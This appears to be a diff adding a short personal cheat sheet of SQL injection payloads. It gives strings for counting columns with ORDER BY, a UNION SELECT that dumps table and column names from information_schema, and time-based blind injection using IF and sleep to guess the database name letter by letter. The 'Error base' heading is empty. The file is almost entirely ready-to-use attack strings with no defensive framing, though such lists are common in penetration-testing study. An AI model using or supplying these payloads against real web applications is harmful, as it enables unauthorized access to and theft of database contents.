@@ -1,0 +1,15 @@
+# Error base
+
+
+# Union
+# Find the number of column
+' ORDER BY 1-- //
+
+# Find table information
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+
+# Blind
+# find it with sleep
+' AND IF (1=1, sleep(3),'false') -- //
+' AND IF (substring(database(),1,1)="b", sleep(3),'false') -- //
+
